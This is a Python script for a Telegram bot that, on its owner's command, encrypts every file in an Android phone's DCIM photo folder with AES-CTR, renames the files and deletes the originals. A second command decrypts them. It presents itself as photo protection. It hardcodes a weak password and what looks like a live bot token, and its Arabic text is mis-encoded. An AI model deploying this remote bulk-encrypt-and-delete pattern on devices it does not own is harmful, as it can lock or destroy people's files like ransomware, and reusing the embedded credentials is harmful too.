import os
import sys
import telebot
import hashlib
from Crypto.Cipher import AES
from Crypto.Util import Counter

# --- Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª ---
BOT_TOKEN = "6752223055:AAE1hbI5zx2_W3miI8IbdoqT2gMSUtmDHUA" 
OWNER_ID = 1431886140
MY_PASSWORD = "mahmoud"
CHUNK_SIZE = 64 * 1024  # Ø­Ø¬Ù… Ø§Ù„Ù‚Ø·Ø¹Ø© (64KB) Ù„Ù„Ø³Ø±Ø¹Ø©

# Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø§ØªØµØ§Ù„
try:
    bot = telebot.TeleBot(BOT_TOKEN)
except Exception as e:
    print("âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªÙˆÙƒÙ†")
    sys.exit()

# --- 1. Ù…Ø­Ø±Ùƒ Ø§Ù„ØªØ´ÙÙŠØ± Ø§Ù„Ø³Ø±ÙŠØ¹ (AES-CTR) ---
def get_key(password):
    return hashlib.sha256(password.encode()).digest()

def process_file_fast(file_path, password, mode):
    try:
        key = get_key(password)
        
        if mode == "encrypt":
            iv = os.urandom(16)
            ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
            cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
            
            output_path = file_path + ".aboelfadl"
            
            with open(file_path, 'rb') as infile, open(output_path, 'wb') as outfile:
                outfile.write(iv) # ÙƒØªØ§Ø¨Ø© IV ÙÙŠ Ø§Ù„Ø¨Ø¯Ø§ÙŠØ©
                while True:
                    chunk = infile.read(CHUNK_SIZE)
                    if len(chunk) == 0: break
                    outfile.write(cipher.encrypt(chunk))
            
            os.remove(file_path)

        elif mode == "decrypt":
            if not file_path.endswith(".aboelfadl"): return False
            
            output_path = file_path.replace(".aboelfadl", "")
            
            with open(file_path, 'rb') as infile, open(output_path, 'wb') as outfile:
                iv = infile.read(16) # Ù‚Ø±Ø§Ø¡Ø© IV
                ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
                cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
                
                while True:
                    chunk = infile.read(CHUNK_SIZE)
                    if len(chunk) == 0: break
                    outfile.write(cipher.decrypt(chunk))
            
            os.remove(file_path)

        return True
    except Exception as e:
        print(f"Error processing {file_path}: {e}")
        return False

# --- 2. Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù…Ø¬Ù„Ø¯ ---
def process_folder_fast(folder_path, password, mode):
    if not os.path.exists(folder_path):
        return "âŒ Ø§Ù„Ù…Ø¬Ù„Ø¯ ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯ Ø£Ùˆ Ù„Ø§ ØªÙˆØ¬Ø¯ ØµÙ„Ø§Ø­ÙŠØ§Øª."
    
    action_name = "ØªØ´ÙÙŠØ±" if mode == "encrypt" else "ÙÙƒ ØªØ´ÙÙŠØ±"
    bot.send_message(OWNER_ID, f"âš¡ Ø¬Ø§Ø±ÙŠ {action_name} Ø§Ù„Ù…Ù„ÙØ§Øª Ø¨Ø£Ù‚ØµÙ‰ Ø³Ø±Ø¹Ø©...")
    
    count = 0
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            
            if mode == "encrypt" and not file.endswith(".aboelfadl"):
                if process_file_fast(file_path, password, "encrypt"):
                    count += 1
            
            elif mode == "decrypt" and file.endswith(".aboelfadl"):
                if process_file_fast(file_path, password, "decrypt"):
                    count += 1
    
    return f"âœ… ØªÙ…Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø¨Ù†Ø¬Ø§Ø­!\nğŸ“‚ Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ù„ÙØ§Øª: {count}"

# --- 3. Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ø¨ÙˆØª ---
@bot.message_handler(commands=['secure'])
def cmd_encrypt(message):
    if message.from_user.id == OWNER_ID:
        # Ù…Ø³Ø§Ø± Ø§Ù„Ø£Ù†Ø¯Ø±ÙˆÙŠØ¯ (ØªØ£ÙƒØ¯ Ù…Ù†Ù‡)
        path = "/storage/emulated/0/DCIM"
        res = process_folder_fast(path, MY_PASSWORD, mode="encrypt") 
        bot.send_message(OWNER_ID, res)

@bot.message_handler(commands=['unlock'])
def cmd_decrypt(message):
    if message.from_user.id == OWNER_ID:
        path = "/storage/emulated/0/DCIM"
        res = process_folder_fast(path, MY_PASSWORD, mode="decrypt") 
        bot.send_message(OWNER_ID, res)

# --- 4. Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªØ±Ø­ÙŠØ¨ Ø¹Ù†Ø¯ Ø§Ù„ØªØ´ØºÙŠÙ„ ---
def send_welcome_msg():
    welcome_text = (
        "ğŸŸ¢ *ØªÙ… ØªØ´ØºÙŠÙ„ Ø¨ÙˆØª AboElfadl Turbo Ø¨Ù†Ø¬Ø§Ø­!*\n\n"
        "Ø§Ù„Ù†Ø¸Ø§Ù… Ø¬Ø§Ù‡Ø² Ø§Ù„Ø¢Ù† ÙˆÙŠØ¹Ù…Ù„ Ø¨ÙˆØ¶Ø¹ Ø§Ù„Ø³Ø±Ø¹Ø© Ø§Ù„Ù‚ØµÙˆÙ‰.\n"
        "ğŸ‘‡ *Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ù…ØªØ§Ø­Ø©:*\n\n"
        "ğŸ”’ /secure  : Ù„ØªØ´ÙÙŠØ± Ù…Ø¬Ù„Ø¯ Ø§Ù„ØµÙˆØ± (DCIM) ÙˆØ­Ù…Ø§ÙŠØªÙ‡.\n"
        "ğŸ”“ /unlock  : Ù„ÙÙƒ Ø§Ù„ØªØ´ÙÙŠØ± ÙˆØ§Ø³ØªØ¹Ø§Ø¯Ø© Ø§Ù„Ù…Ù„ÙØ§Øª.\n\n"
        "âš ï¸ *ØªÙ†Ø¨ÙŠÙ‡:* Ø§Ø­ØªÙØ¸ Ø¨ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± ÙˆÙ„Ø§ ØªØ­Ø°Ù Ø§Ù„Ø¨ÙˆØª Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø¹Ù…Ù„."
    )
    try:
        bot.send_message(OWNER_ID, welcome_text, parse_mode="Markdown")
        print("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªØ±Ø­ÙŠØ¨ Ù„Ù„Ù…Ø§Ù„Ùƒ.")
    except Exception as e:
        print(f"âŒ Ù„Ù… ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø©: {e}")

# Ø§Ù„ØªØ´ØºÙŠÙ„
if __name__ == "__main__":
    print("ğŸš€ Turbo Bot Started...")
    send_welcome_msg() # Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© ÙÙˆØ±Ø§Ù‹
    bot.infinity_polling()